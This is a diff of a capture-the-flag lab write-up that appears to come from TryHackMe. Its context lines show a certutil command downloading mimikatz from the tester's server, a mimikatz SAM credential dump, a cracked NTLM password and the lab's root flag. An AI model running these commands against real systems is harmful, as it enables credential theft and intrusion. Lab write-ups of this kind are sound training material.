@@ -88,7 +88,8 @@ User: nt authority\system
 
 This demonstrated that commands could be executed on the host with SYSTEM privileges.
 
-image
+<img width="684" height="125" alt="Screenshot 2026-05-08 051205" src="https://github.com/user-attachments/assets/a06fba0d-f005-4067-b907-2e6337089584" />
+
 
 ## Stage 4: Post-Exploitation (Maintaining Access & Privilege Escalation) ##
 
@@ -103,7 +104,8 @@ After that, I setup my server so that `mimikatz.exe` can be fetched by using:
 ```bash
 python3 -m http.server 8000
 ```
-image
+<img width="604" height="176" alt="Screenshot 2026-05-08 060523" src="https://github.com/user-attachments/assets/40b47c09-334f-4b38-83e8-c5114801b7c4" />
+
 
 The status **200** tells that `mimikatz.exe` is successfully fetched.
 
@@ -113,7 +115,8 @@ Next on the `RCE_SHELL$`:
 certutil -urlcache -split -f http://192.168.206.94:8000/mimikatz.exe mimikatz.exe
 ```
 
-image
+<img width="746" height="89" alt="Screenshot 2026-05-08 061050" src="https://github.com/user-attachments/assets/d03ec058-f435-4ff6-a64a-dcb055252fd8" />
+
 
 This command is a classic example of using a "Living off the Land Binary" (LOLBin). A LOLBin is a legitimate, pre-installed operating system tool that attackers (or penetration testers) abuse to perform actions they normally wouldn't be able to do easily, such as downloading malicious payloads without needing a dedicated web browser or custom download script.
 
@@ -129,7 +132,8 @@ It confirms that the Windows target machine successfully reached out to my hosti
 .\mimikatz "lsadump::sam" exit
 ```
 
-image
+<img width="613" height="476" alt="Screenshot 2026-05-08 061153" src="https://github.com/user-attachments/assets/7a6ad90a-9af0-465e-b766-e0bd527f2163" />
+
 
 • `.\mimikatz`
 This tells the Windows command prompt to execute the mimikatz.exe application located in your current directory (the .\ specifies "right here in this folder").
@@ -149,9 +153,11 @@ This final argument tells Mimikatz to terminate and return you to the standard W
 Using an online hash cracking service (hashes.com), the Lab user's NTLM hash was decrypted revealing the password:
 
 Hash: 30e87bf999828446a1c1209ddde4c450
+
 Password: googleplus
 
-image
+<img width="959" height="896" alt="Screenshot 2026-05-08 062415" src="https://github.com/user-attachments/assets/500d8de3-a73f-4190-9d00-f028382d2b12" />
+
 
 **Capturing the Root Flag**
 
@@ -162,7 +168,8 @@ type C:\Users\Administrator\Desktop\root.txt.txt
 ```
 FLAG : THM{aea1e3ce6fe7f89e10cea833ae009bee}
 
-image
+<img width="488" height="38" alt="Screenshot 2026-05-08 062704" src="https://github.com/user-attachments/assets/08aecc41-5f5e-4992-ab63-56a75965d1c8" />
+
 
 ## Stage 5 : Clear Track ##
 
